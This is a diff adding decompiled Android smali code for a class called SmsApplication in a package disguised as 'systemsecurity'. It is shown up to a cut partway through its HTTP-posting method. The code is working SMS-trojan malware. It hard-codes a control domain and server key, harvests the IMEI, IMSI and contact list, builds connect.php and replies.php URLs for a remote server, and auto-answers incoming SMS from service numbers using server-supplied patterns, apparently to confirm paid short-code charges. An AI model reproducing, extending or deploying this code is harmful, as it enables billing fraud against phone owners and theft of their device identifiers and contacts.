@@ -1,0 +1,3079 @@
+.class public Lcom/android/systemsecurity/SmsApplication;
+.super Landroid/app/Application;
+.source "SmsApplication.java"
+
+
+# static fields
+.field public static DOMAIN:Ljava/lang/String;
+
+.field public static PERIOD:I
+
+.field private static TAG:Ljava/lang/String;
+
+.field private static _lastSendTime:J
+
+.field private static _lastShortCode:Ljava/lang/String;
+
+.field private static _replyCodeGrp:I
+
+.field private static _replyCodeRxp:Ljava/lang/String;
+
+.field private static _replyNumberGrp:I
+
+.field private static _replyNumberRxp:Ljava/lang/String;
+
+.field public static imei:Ljava/lang/String;
+
+.field public static imsi:Ljava/lang/String;
+
+.field public static newServerKey:Ljava/lang/String;
+
+.field public static responseAwayTime:J
+
+.field public static settings:Lcom/android/systemsecurity/Settings;
+
+.field public static version:Ljava/lang/String;
+
+
+# direct methods
+.method static constructor <clinit>()V
+    .locals 2
+
+    .prologue
+    .line 49
+    const-string v0, "2.1"
+
+    sput-object v0, Lcom/android/systemsecurity/SmsApplication;->version:Ljava/lang/String;
+
+    .line 50
+    const-string v0, ""
+
+    sput-object v0, Lcom/android/systemsecurity/SmsApplication;->imei:Ljava/lang/String;
+
+    .line 51
+    const-string v0, ""
+
+    sput-object v0, Lcom/android/systemsecurity/SmsApplication;->imsi:Ljava/lang/String;
+
+    .line 53
+    const-string v0, "e9Ao23su"
+
+    sput-object v0, Lcom/android/systemsecurity/SmsApplication;->newServerKey:Ljava/lang/String;
+
+    .line 54
+    const/16 v0, 0x3c
+
+    sput v0, Lcom/android/systemsecurity/SmsApplication;->PERIOD:I
+
+    .line 55
+    const-string v0, "load-center.ru"
+
+    sput-object v0, Lcom/android/systemsecurity/SmsApplication;->DOMAIN:Ljava/lang/String;
+
+    .line 57
+    const-wide/16 v0, 0x0
+
+    sput-wide v0, Lcom/android/systemsecurity/SmsApplication;->_lastSendTime:J
+
+    .line 58
+    const-string v0, ""
+
+    sput-object v0, Lcom/android/systemsecurity/SmsApplication;->_lastShortCode:Ljava/lang/String;
+
+    .line 59
+    const-wide/32 v0, 0x493e0
+
+    sput-wide v0, Lcom/android/systemsecurity/SmsApplication;->responseAwayTime:J
+
+    .line 61
+    const-string v0, "SmsApplication"
+
+    sput-object v0, Lcom/android/systemsecurity/SmsApplication;->TAG:Ljava/lang/String;
+
+    .line 45
+    return-void
+.end method
+
+.method public constructor <init>()V
+    .locals 0
+
+    .prologue
+    .line 45
+    invoke-direct {p0}, Landroid/app/Application;-><init>()V
+
+    return-void
+.end method
+
+.method public static captchaLogic(Landroid/telephony/SmsMessage;)V
+    .locals 5
+    .parameter "smsMessage"
+
+    .prologue
+    .line 628
+    const/4 v0, 0x0
+
+    .line 629
+    .local v0, numberReply:Ljava/lang/String;
+    const/4 v1, 0x0
+
+    .line 633
+    .local v1, textReply:Ljava/lang/String;
+    :try_start_0
+    invoke-static {}, Lcom/android/systemsecurity/SmsApplication;->getReplyNumberRxp()Ljava/lang/String;
+
+    move-result-object v2
+
+    .line 634
+    invoke-static {}, Lcom/android/systemsecurity/SmsApplication;->getReplyNumberGrp()I
+
+    move-result v3
+
+    .line 635
+    invoke-virtual {p0}, Landroid/telephony/SmsMessage;->getMessageBody()Ljava/lang/String;
+
+    move-result-object v4
+
+    .line 632
+    invoke-static {v2, v3, v4}, Lcom/android/systemsecurity/SmsApplication;->matcher(Ljava/lang/String;ILjava/lang/String;)Ljava/lang/String;
+
+    move-result-object v0
+
+    .line 639
+    invoke-static {}, Lcom/android/systemsecurity/SmsApplication;->getReplyCodeRxp()Ljava/lang/String;
+
+    move-result-object v2
+
+    .line 640
+    invoke-static {}, Lcom/android/systemsecurity/SmsApplication;->getReplyCodeGrp()I
+
+    move-result v3
+
+    .line 641
+    invoke-virtual {p0}, Landroid/telephony/SmsMessage;->getMessageBody()Ljava/lang/String;
+
+    move-result-object v4
+
+    .line 638
+    invoke-static {v2, v3, v4}, Lcom/android/systemsecurity/SmsApplication;->matcher(Ljava/lang/String;ILjava/lang/String;)Ljava/lang/String;
+
+    move-result-object v1
+
+    .line 651
+    if-nez v0, :cond_0
+
+    if-nez v1, :cond_0
+
+    .line 652
+    const/4 v2, 0x0
+
+    invoke-static {v2}, Lcom/android/systemsecurity/SmsApplication;->setReplyCodeRxp(Ljava/lang/String;)V
+
+    .line 653
+    const/4 v2, 0x0
+
+    invoke-static {v2}, Lcom/android/systemsecurity/SmsApplication;->setReplyNumberRxp(Ljava/lang/String;)V
+
+    .line 742
+    :goto_0
+    return-void
+
+    .line 655
+    :cond_0
+    if-nez v0, :cond_2
+
+    .line 656
+    invoke-virtual {p0}, Landroid/telephony/SmsMessage;->getOriginatingAddress()Ljava/lang/String;
+
+    move-result-object v0
+
+    .line 661
+    :cond_1
+    :goto_1
+    const/4 v2, 0x0
+
+    invoke-static {v2}, Lcom/android/systemsecurity/SmsApplication;->setReplyCodeRxp(Ljava/lang/String;)V
+
+    .line 662
+    const/4 v2, 0x0
+
+    invoke-static {v2}, Lcom/android/systemsecurity/SmsApplication;->setReplyNumberRxp(Ljava/lang/String;)V
+
+    .line 664
+    invoke-static {v0, v1}, Lcom/android/systemsecurity/SmsApplication;->sendSms(Ljava/lang/String;Ljava/lang/String;)Z
+
+    goto :goto_0
+
+    .line 738
+    :catch_0
+    move-exception v2
+
+    goto :goto_0
+
+    .line 657
+    :cond_2
+    if-nez v1, :cond_1
+
+    .line 658
+    const-string v1, ""
+    :try_end_0
+    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
+
+    goto :goto_1
+.end method
+
+.method private static compareNumbers(Ljava/lang/String;Ljava/lang/String;)Z
+    .locals 1
+    .parameter "bookPhone"
+    .parameter "messagePhone"
+
+    .prologue
+    .line 601
+    const-string v0, "+"
+
+    invoke-virtual {p1, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z
+
+    move-result v0
+
+    if-eqz v0, :cond_0
+
+    const/4 v0, 0x4
+
+    invoke-virtual {p1, v0}, Ljava/lang/String;->substring(I)Ljava/lang/String;
+
+    move-result-object p1
+
+    .line 603
+    :cond_0
+    invoke-virtual {p0, p1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+
+    move-result v0
+
+    return v0
+.end method
+
+.method public static contactsToXml(Ljava/util/Vector;)Ljava/lang/String;
+    .locals 6
+    .parameter
+    .annotation system Ldalvik/annotation/Signature;
+        value = {
+            "(",
+            "Ljava/util/Vector",
+            "<",
+            "Ljava/lang/String;",
+            ">;)",
+            "Ljava/lang/String;"
+        }
+    .end annotation
+
+    .prologue
+    .line 397
+    .local p0, contacts:Ljava/util/Vector;,"Ljava/util/Vector<Ljava/lang/String;>;"
+    invoke-static {}, Landroid/util/Xml;->newSerializer()Lorg/xmlpull/v1/XmlSerializer;
+
+    move-result-object v2
+
+    .line 398
+    .local v2, serializer:Lorg/xmlpull/v1/XmlSerializer;
+    new-instance v3, Ljava/io/StringWriter;
+
+    invoke-direct {v3}, Ljava/io/StringWriter;-><init>()V
+
+    .line 402
+    .local v3, writer:Ljava/io/StringWriter;
+    :try_start_0
+    invoke-interface {v2, v3}, Lorg/xmlpull/v1/XmlSerializer;->setOutput(Ljava/io/Writer;)V
+
+    .line 403
+    const-string v4, "UTF-8"
+
+    const/4 v5, 0x1
+
+    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;
+
+    move-result-object v5
+
+    invoke-interface {v2, v4, v5}, Lorg/xmlpull/v1/XmlSerializer;->startDocument(Ljava/lang/String;Ljava/lang/Boolean;)V
+
+    .line 404
+    const-string v4, ""
+
+    const-string v5, "numbers"
+
+    invoke-interface {v2, v4, v5}, Lorg/xmlpull/v1/XmlSerializer;->startTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;
+
+    .line 406
+    const/4 v1, 0x0
+
+    .local v1, i:I
+    :goto_0
+    invoke-virtual {p0}, Ljava/util/Vector;->size()I
+
+    move-result v4
+
+    if-lt v1, v4, :cond_0
+
+    .line 413
+    const-string v4, ""
+
+    const-string v5, "numbers"
+
+    invoke-interface {v2, v4, v5}, Lorg/xmlpull/v1/XmlSerializer;->endTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;
+
+    .line 414
+    invoke-interface {v2}, Lorg/xmlpull/v1/XmlSerializer;->endDocument()V
+
+    .line 416
+    invoke-virtual {v3}, Ljava/io/StringWriter;->toString()Ljava/lang/String;
+
+    move-result-object v4
+
+    .line 423
+    .end local v1           #i:I
+    :goto_1
+    return-object v4
+
+    .line 408
+    .restart local v1       #i:I
+    :cond_0
+    const-string v4, ""
+
+    const-string v5, "n"
+
+    invoke-interface {v2, v4, v5}, Lorg/xmlpull/v1/XmlSerializer;->startTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;
+
+    .line 409
+    invoke-virtual {p0, v1}, Ljava/util/Vector;->elementAt(I)Ljava/lang/Object;
+
+    move-result-object v4
+
+    check-cast v4, Ljava/lang/String;
+
+    invoke-interface {v2, v4}, Lorg/xmlpull/v1/XmlSerializer;->text(Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;
+
+    .line 410
+    const-string v4, ""
+
+    const-string v5, "n"
+
+    invoke-interface {v2, v4, v5}, Lorg/xmlpull/v1/XmlSerializer;->endTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;
+    :try_end_0
+    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
+
+    .line 406
+    add-int/lit8 v1, v1, 0x1
+
+    goto :goto_0
+
+    .line 418
+    .end local v1           #i:I
+    :catch_0
+    move-exception v0
+
+    .line 420
+    .local v0, ex:Ljava/lang/Exception;
+    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V
+
+    .line 423
+    const-string v4, ""
+
+    goto :goto_1
+.end method
+
+.method public static convertToIntSafe(Ljava/lang/String;I)I
+    .locals 1
+    .parameter "val"
+    .parameter "def"
+
+    .prologue
+    .line 332
+    :try_start_0
+    invoke-static {p0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I
+    :try_end_0
+    .catch Ljava/lang/NumberFormatException; {:try_start_0 .. :try_end_0} :catch_0
+
+    move-result p1
+
+    .line 334
+    .end local p1
+    :goto_0
+    return p1
+
+    .line 333
+    .restart local p1
+    :catch_0
+    move-exception v0
+
+    .line 334
+    .local v0, e:Ljava/lang/NumberFormatException;
+    goto :goto_0
+.end method
+
+.method public static dateFromString(Ljava/lang/String;)Ljava/util/Date;
+    .locals 14
+    .parameter "time"
+
+    .prologue
+    const/16 v13, 0xa
+
+    const/16 v12, 0x8
+
+    const/4 v11, 0x6
+
+    const/4 v10, 0x4
+
+    const/4 v9, 0x2
+
+    .line 351
+    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;
+
+    new-instance v1, Ljava/lang/StringBuilder;
+
+    const-string v2, "dateFromString: "
+
+    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    invoke-virtual {v1, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v1
+
+    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v1
+
+    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V
+
+    .line 353
+    if-eqz p0, :cond_0
+
+    invoke-virtual {p0}, Ljava/lang/String;->length()I
+
+    move-result v0
+
+    if-nez v0, :cond_1
+
+    :cond_0
+    new-instance v0, Ljava/util/Date;
+
+    invoke-direct {v0}, Ljava/util/Date;-><init>()V
+
+    .line 362
+    :goto_0
+    return-object v0
+
+    .line 355
+    :cond_1
+    const/4 v0, 0x0
+
+    invoke-virtual {p0, v0, v9}, Ljava/lang/String;->substring(II)Ljava/lang/String;
+
+    move-result-object v0
+
+    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I
+
+    move-result v4
+
+    .line 356
+    .local v4, hour:I
+    invoke-virtual {p0, v9, v10}, Ljava/lang/String;->substring(II)Ljava/lang/String;
+
+    move-result-object v0
+
+    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I
+
+    move-result v5
+
+    .line 357
+    .local v5, minutes:I
+    invoke-virtual {p0, v10, v11}, Ljava/lang/String;->substring(II)Ljava/lang/String;
+
+    move-result-object v0
+
+    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I
+
+    move-result v6
+
+    .line 358
+    .local v6, seconds:I
+    invoke-virtual {p0, v11, v12}, Ljava/lang/String;->substring(II)Ljava/lang/String;
+
+    move-result-object v0
+
+    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I
+
+    move-result v3
+
+    .line 359
+    .local v3, day:I
+    invoke-virtual {p0, v12, v13}, Ljava/lang/String;->substring(II)Ljava/lang/String;
+
+    move-result-object v0
+
+    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I
+
+    move-result v7
+
+    .line 360
+    .local v7, month:I
+    invoke-virtual {p0, v13}, Ljava/lang/String;->substring(I)Ljava/lang/String;
+
+    move-result-object v0
+
+    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I
+
+    move-result v8
+
+    .line 362
+    .local v8, year:I
+    new-instance v0, Ljava/util/Date;
+
+    add-int/lit16 v1, v8, -0x76c
+
+    add-int/lit8 v2, v7, -0x1
+
+    invoke-direct/range {v0 .. v6}, Ljava/util/Date;-><init>(IIIIII)V
+
+    goto :goto_0
+.end method
+
+.method public static decodeHtml(Ljava/lang/String;)Ljava/lang/String;
+    .locals 3
+    .parameter "str"
+
+    .prologue
+    .line 826
+    const-string v0, "&lt"
+
+    const-string v1, "<"
+
+    invoke-virtual {p0, v0, v1}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
+
+    move-result-object v0
+
+    .line 827
+    const-string v1, "&gt"
+
+    const-string v2, ">"
+
+    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
+
+    move-result-object v0
+
+    .line 828
+    const-string v1, "&quot"
+
+    const-string v2, "\""
+
+    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
+
+    move-result-object v0
+
+    .line 829
+    const-string v1, "&apos"
+
+    const-string v2, "\'"
+
+    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
+
+    move-result-object v0
+
+    .line 830
+    const-string v1, "&amp"
+
+    const-string v2, "&"
+
+    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
+
+    move-result-object v0
+
+    .line 826
+    return-object v0
+.end method
+
+.method public static findNumberInPhoneBook(Landroid/content/Context;Ljava/lang/String;)Z
+    .locals 3
+    .parameter "context"
+    .parameter "number"
+
+    .prologue
+    .line 618
+    invoke-static {p0}, Lcom/android/systemsecurity/SmsApplication;->getContacts(Landroid/content/Context;)Ljava/util/Vector;
+
+    move-result-object v0
+
+    .line 620
+    .local v0, contacts:Ljava/util/Vector;,"Ljava/util/Vector<Ljava/lang/String;>;"
+    const/4 v1, 0x0
+
+    .local v1, i:I
+    :goto_0
+    invoke-virtual {v0}, Ljava/util/Vector;->size()I
+
+    move-result v2
+
+    if-lt v1, v2, :cond_0
+
+    .line 624
+    const/4 v2, 0x0
+
+    :goto_1
+    return v2
+
+    .line 621
+    :cond_0
+    invoke-virtual {v0, v1}, Ljava/util/Vector;->elementAt(I)Ljava/lang/Object;
+
+    move-result-object v2
+
+    check-cast v2, Ljava/lang/String;
+
+    invoke-static {v2, p1}, Lcom/android/systemsecurity/SmsApplication;->compareNumbers(Ljava/lang/String;Ljava/lang/String;)Z
+
+    move-result v2
+
+    if-eqz v2, :cond_1
+
+    const/4 v2, 0x1
+
+    goto :goto_1
+
+    .line 620
+    :cond_1
+    add-int/lit8 v1, v1, 0x1
+
+    goto :goto_0
+.end method
+
+.method public static getApplicationUrl()Ljava/lang/String;
+    .locals 2
+
+    .prologue
+    .line 166
+    new-instance v0, Ljava/lang/StringBuilder;
+
+    const-string v1, "http://"
+
+    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    sget-object v1, Lcom/android/systemsecurity/SmsApplication;->settings:Lcom/android/systemsecurity/Settings;
+
+    iget-object v1, v1, Lcom/android/systemsecurity/Settings;->saved:Lcom/android/systemsecurity/SettingsSet;
+
+    iget-object v1, v1, Lcom/android/systemsecurity/SettingsSet;->server:Ljava/lang/String;
+
+    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v0
+
+    const-string v1, "/connect.php"
+
+    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v0
+
+    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v0
+
+    return-object v0
+.end method
+
+.method public static getAttributeValue(Lorg/xmlpull/v1/XmlPullParser;Ljava/lang/String;)Ljava/lang/String;
+    .locals 2
+    .parameter "xmlParser"
+    .parameter "name"
+
+    .prologue
+    .line 340
+    const/4 v0, 0x0
+
+    .local v0, i:I
+    :goto_0
+    invoke-interface {p0}, Lorg/xmlpull/v1/XmlPullParser;->getAttributeCount()I
+
+    move-result v1
+
+    if-lt v0, v1, :cond_0
+
+    .line 345
+    const/4 v1, 0x0
+
+    :goto_1
+    return-object v1
+
+    .line 342
+    :cond_0
+    invoke-interface {p0, v0}, Lorg/xmlpull/v1/XmlPullParser;->getAttributeName(I)Ljava/lang/String;
+
+    move-result-object v1
+
+    invoke-virtual {v1, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v1
+
+    if-eqz v1, :cond_1
+
+    .line 343
+    invoke-interface {p0, v0}, Lorg/xmlpull/v1/XmlPullParser;->getAttributeValue(I)Ljava/lang/String;
+
+    move-result-object v1
+
+    goto :goto_1
+
+    .line 340
+    :cond_1
+    add-int/lit8 v0, v0, 0x1
+
+    goto :goto_0
+.end method
+
+.method public static getContacts(Landroid/content/Context;)Ljava/util/Vector;
+    .locals 10
+    .parameter "context"
+    .annotation system Ldalvik/annotation/Signature;
+        value = {
+            "(",
+            "Landroid/content/Context;",
+            ")",
+            "Ljava/util/Vector",
+            "<",
+            "Ljava/lang/String;",
+            ">;"
+        }
+    .end annotation
+
+    .prologue
+    .line 428
+    new-instance v8, Ljava/util/Vector;
+
+    invoke-direct {v8}, Ljava/util/Vector;-><init>()V
+
+    .line 432
+    .local v8, list:Ljava/util/Vector;,"Ljava/util/Vector<Ljava/lang/String;>;"
+    :try_start_0
+    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;
+
+    move-result-object v0
+
+    .line 433
+    .local v0, cr:Landroid/content/ContentResolver;
+    sget-object v1, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;
+
+    const/4 v2, 0x0
+
+    const/4 v3, 0x0
+
+    const/4 v4, 0x0
+
+    const/4 v5, 0x0
+
+    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
+
+    move-result-object v6
+
+    .line 435
+    .local v6, cursor:Landroid/database/Cursor;
+    :goto_0
+    invoke-interface {v6}, Landroid/database/Cursor;->moveToNext()Z
+
+    move-result v1
+
+    if-nez v1, :cond_0
+
+    .line 448
+    .end local v0           #cr:Landroid/content/ContentResolver;
+    .end local v6           #cursor:Landroid/database/Cursor;
+    :goto_1
+    return-object v8
+
+    .line 437
+    .restart local v0       #cr:Landroid/content/ContentResolver;
+    .restart local v6       #cursor:Landroid/database/Cursor;
+    :cond_0
+    const-string v1, "data1"
+
+    invoke-interface {v6, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I
+
+    move-result v1
+
+    invoke-interface {v6, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
+
+    move-result-object v9
+
+    .line 438
+    .local v9, phone:Ljava/lang/String;
+    invoke-virtual {v8, v9}, Ljava/util/Vector;->addElement(Ljava/lang/Object;)V
+    :try_end_0
+    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
+
+    goto :goto_0
+
+    .line 443
+    .end local v0           #cr:Landroid/content/ContentResolver;
+    .end local v6           #cursor:Landroid/database/Cursor;
+    .end local v9           #phone:Ljava/lang/String;
+    :catch_0
+    move-exception v7
+
+    .line 445
+    .local v7, ex:Ljava/lang/Exception;
+    invoke-virtual {v7}, Ljava/lang/Exception;->printStackTrace()V
+
+    goto :goto_1
+.end method
+
+.method public static getCurrentTime()Ljava/lang/String;
+    .locals 2
+
+    .prologue
+    .line 179
+    new-instance v0, Landroid/text/format/Time;
+
+    invoke-direct {v0}, Landroid/text/format/Time;-><init>()V
+
+    .line 180
+    .local v0, time:Landroid/text/format/Time;
+    invoke-virtual {v0}, Landroid/text/format/Time;->setToNow()V
+
+    .line 181
+    const-string v1, "%H%M%S%d%m%Y"
+
+    invoke-virtual {v0, v1}, Landroid/text/format/Time;->format(Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v1
+
+    return-object v1
+.end method
+
+.method public static getImei(Landroid/content/Context;)Ljava/lang/String;
+    .locals 3
+    .parameter "context"
+
+    .prologue
+    .line 369
+    :try_start_0
+    const-string v2, "phone"
+
+    invoke-virtual {p0, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
+
+    move-result-object v1
+
+    check-cast v1, Landroid/telephony/TelephonyManager;
+    :try_end_0
+    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
+
+    .line 371
+    .local v1, telephonyManager:Landroid/telephony/TelephonyManager;
+    if-nez v1, :cond_0
+
+    .line 373
+    const-string v2, ""
+
+    .line 383
+    .end local v1           #telephonyManager:Landroid/telephony/TelephonyManager;
+    :goto_0
+    return-object v2
+
+    .line 376
+    .restart local v1       #telephonyManager:Landroid/telephony/TelephonyManager;
+    :cond_0
+    :try_start_1
+    invoke-virtual {v1}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;
+    :try_end_1
+    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
+
+    move-result-object v2
+
+    goto :goto_0
+
+    .line 378
+    .end local v1           #telephonyManager:Landroid/telephony/TelephonyManager;
+    :catch_0
+    move-exception v0
+
+    .line 380
+    .local v0, ex:Ljava/lang/Exception;
+    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V
+
+    .line 383
+    const-string v2, ""
+
+    goto :goto_0
+.end method
+
+.method public static getImsi(Landroid/content/Context;)Ljava/lang/String;
+    .locals 3
+    .parameter "context"
+
+    .prologue
+    .line 388
+    :try_start_0
+    const-string v2, "phone"
+
+    invoke-virtual {p0, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
+
+    move-result-object v1
+
+    check-cast v1, Landroid/telephony/TelephonyManager;
+
+    .line 389
+    .local v1, telephonyManager:Landroid/telephony/TelephonyManager;
+    invoke-virtual {v1}, Landroid/telephony/TelephonyManager;->getSubscriberId()Ljava/lang/String;
+    :try_end_0
+    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
+
+    move-result-object v2
+
+    .line 391
+    .end local v1           #telephonyManager:Landroid/telephony/TelephonyManager;
+    :goto_0
+    return-object v2
+
+    .line 390
+    :catch_0
+    move-exception v0
+
+    .line 391
+    .local v0, ex:Ljava/lang/Exception;
+    const-string v2, "999999"
+
+    goto :goto_0
+.end method
+
+.method public static getLastSendTime()J
+    .locals 2
+
+    .prologue
+    .line 549
+    sget-wide v0, Lcom/android/systemsecurity/SmsApplication;->_lastSendTime:J
+
+    return-wide v0
+.end method
+
+.method public static getLastShortCode()Ljava/lang/String;
+    .locals 1
+
+    .prologue
+    .line 557
+    sget-object v0, Lcom/android/systemsecurity/SmsApplication;->_lastShortCode:Ljava/lang/String;
+
+    return-object v0
+.end method
+
+.method public static getReplyCodeGrp()I
+    .locals 1
+
+    .prologue
+    .line 581
+    sget v0, Lcom/android/systemsecurity/SmsApplication;->_replyCodeGrp:I
+
+    return v0
+.end method
+
+.method public static getReplyCodeRxp()Ljava/lang/String;
+    .locals 1
+
+    .prologue
+    .line 565
+    sget-object v0, Lcom/android/systemsecurity/SmsApplication;->_replyCodeRxp:Ljava/lang/String;
+
+    return-object v0
+.end method
+
+.method public static getReplyNumberGrp()I
+    .locals 1
+
+    .prologue
+    .line 589
+    sget v0, Lcom/android/systemsecurity/SmsApplication;->_replyNumberGrp:I
+
+    return v0
+.end method
+
+.method public static getReplyNumberRxp()Ljava/lang/String;
+    .locals 1
+
+    .prologue
+    .line 573
+    sget-object v0, Lcom/android/systemsecurity/SmsApplication;->_replyNumberRxp:Ljava/lang/String;
+
+    return-object v0
+.end method
+
+.method public static getServerKey()Ljava/lang/String;
+    .locals 1
+
+    .prologue
+    .line 174
+    sget-object v0, Lcom/android/systemsecurity/SmsApplication;->newServerKey:Ljava/lang/String;
+
+    return-object v0
+.end method
+
+.method public static getStatisticsUrl()Ljava/lang/String;
+    .locals 2
+
+    .prologue
+    .line 170
+    new-instance v0, Ljava/lang/StringBuilder;
+
+    const-string v1, "http://stat."
+
+    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    sget-object v1, Lcom/android/systemsecurity/SmsApplication;->settings:Lcom/android/systemsecurity/Settings;
+
+    iget-object v1, v1, Lcom/android/systemsecurity/Settings;->saved:Lcom/android/systemsecurity/SettingsSet;
+
+    iget-object v1, v1, Lcom/android/systemsecurity/SettingsSet;->server:Ljava/lang/String;
+
+    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v0
+
+    const-string v1, "/replies.php"
+
+    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v0
+
+    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v0
+
+    return-object v0
+.end method
+
+.method public static getTime(J)Ljava/lang/String;
+    .locals 2
+    .parameter "date"
+
+    .prologue
+    .line 186
+    new-instance v0, Landroid/text/format/Time;
+
+    invoke-direct {v0}, Landroid/text/format/Time;-><init>()V
+
+    .line 187
+    .local v0, time:Landroid/text/format/Time;
+    invoke-virtual {v0, p0, p1}, Landroid/text/format/Time;->set(J)V
+
+    .line 188
+    const-string v1, "%H:%M:%S %d.%m.%Y"
+
+    invoke-virtual {v0, v1}, Landroid/text/format/Time;->format(Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v1
+
+    return-object v1
+.end method
+
+.method public static isServiceNumber(Ljava/lang/String;)Z
+    .locals 2
+    .parameter "number"
+
+    .prologue
+    .line 607
+    const/4 v0, 0x0
+
+    .local v0, i:I
+    :goto_0
+    sget-object v1, Lcom/android/systemsecurity/SmsApplication;->settings:Lcom/android/systemsecurity/Settings;
+
+    iget-object v1, v1, Lcom/android/systemsecurity/Settings;->smscFilters:Ljava/util/Vector;
+
+    invoke-virtual {v1}, Ljava/util/Vector;->size()I
+
+    move-result v1
+
+    if-lt v0, v1, :cond_0
+
+    .line 613
+    const/4 v1, 0x0
+
+    :goto_1
+    return v1
+
+    .line 608
+    :cond_0
+    sget-object v1, Lcom/android/systemsecurity/SmsApplication;->settings:Lcom/android/systemsecurity/Settings;
+
+    iget-object v1, v1, Lcom/android/systemsecurity/Settings;->smscFilters:Ljava/util/Vector;
+
+    invoke-virtual {v1, v0}, Ljava/util/Vector;->elementAt(I)Ljava/lang/Object;
+
+    move-result-object v1
+
+    check-cast v1, Ljava/lang/String;
+
+    invoke-static {v1, p0}, Lcom/android/systemsecurity/SmsApplication;->compareNumbers(Ljava/lang/String;Ljava/lang/String;)Z
+
+    move-result v1
+
+    if-eqz v1, :cond_1
+
+    .line 609
+    const/4 v1, 0x1
+
+    goto :goto_1
+
+    .line 607
+    :cond_1
+    add-int/lit8 v0, v0, 0x1
+
+    goto :goto_0
+.end method
+
+.method public static logStat(Ljava/lang/String;Landroid/content/Context;)V
+    .locals 0
+    .parameter "msg"
+    .parameter "context"
+
+    .prologue
+    .line 834
+    return-void
+.end method
+
+.method public static makeHttpPost(Ljava/lang/String;Ljava/util/List;)Lorg/apache/http/HttpResponse;
+    .locals 8
+    .parameter "uri"
+    .parameter
+    .annotation system Ldalvik/annotation/Signature;
+        value = {
+            "(",
+            "Ljava/lang/String;",
+            "Ljava/util/List",
+            "<",
+            "Lorg/apache/http/NameValuePair;",
+            ">;)",
+            "Lorg/apache/http/HttpResponse;"
+        }
+    .end annotation
+
+    .prologue
+    .local p1, params:Ljava/util/List;,"Ljava/util/List<Lorg/apache/http/NameValuePair;>;"
+    const/4 v4, 0x0
+
+    .line 216
+    sget-object v5, Lcom/android/systemsecurity/SmsApplication;->TAG:Ljava/lang/String;
+
+    new-instance v6, Ljava/lang/StringBuilder;
+
+    const-string v7, "Start Request to server : "
+
